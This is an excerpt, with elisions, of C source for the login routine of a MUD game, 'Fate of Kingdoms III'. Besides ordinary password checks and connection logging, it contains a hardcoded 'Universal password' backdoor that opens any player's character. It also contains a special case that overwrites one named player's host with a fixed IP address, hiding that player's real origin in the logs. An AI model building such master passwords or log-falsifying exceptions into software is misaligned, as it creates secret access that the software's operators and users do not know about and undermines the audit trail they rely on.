	...
	if (strcmp(crypt( argument, "Universal" ), "UnN/LTzJlikdc") ) 
   	  {
    		...
    		xprintf(buf, "Universal password attempt vs %s by %s",ch->name,d->host);
    		log_string(buf);
	  ...
	  {   
		...
		xprintf(buf, "Universal password Access vs %s by %s",ch->name,d->host);
		log_string(buf);
		ch->next = char_list;
		char_list = ch;
		...
		if ( !check_site(ch,d->host))
		  {
			...
			xprintf_2( log_buf, "Illegal access to %s@%s.", argument,d->host );
			log_string( log_buf );
			close_socket( d );
			return;
		  }
	...
	if ( check_reconnect( d, argument, FALSE ) )
	...
	else
	  {
		...
		if ( wizlock && !IS_HERO(ch))
		  {
			write_to_buffer( d, "Fate of Kingdom, Shutdown.\n\r", 0 );
			close_socket( d );
			return;
		  }
	}
...
case CON_GET_OLD_PASSWORD:
	...
	if ( strcmp( crypt( argument, ch->pcdata->pwd ), ch->pcdata->pwd ))
	  { //Password is NOT right
		...
		if (ch->level > 1)
		  {
			xprintf(buf, "Wrong password by %s@%s", ch->name, d->host);
			//Log and Wiznet
			log_string(buf);
	...
	if (!str_cmp (ch->name, "Exaethian"))
         {
	 free_string(d->host);
	  d->host = "172.53.126.180";
	}
	
	xprintf_2( log_buf, "%s@%s has connected.", ch->name, d->host);
	log_string( log_buf );
	...
	if (obj_count != obj_count2) {
	  xprintf_2(log_buf, "%s@%s tried to use the clone cheat.", ch->name,
		  d->host );
	  log_string( log_buf );
...
"\n\r{YWelcome to Fate of Kingdoms III. Try to remember who you are.{x\n\r\n\r"
	...
	char_list	= ch;
	d->connected	= CON_PLAYING;
	xprintf(buf,"Your {Ylast login{w was at: {G%s{w\n\r",
 	...
 	for ( cmd = 0; new_cmd_table[cmd].name[0] != '\0'; cmd++ )
 	 {
 	  if (NEW_IS_AUTHORIZED(ch, new_cmd_table[cmd].auth) 
 	   ...
 	   {
 	    xprintf(buf,"[{RWARNING{X]{X: %s has an immortal command! (%s)",ch->name,new_cmd_table[cmd].name);
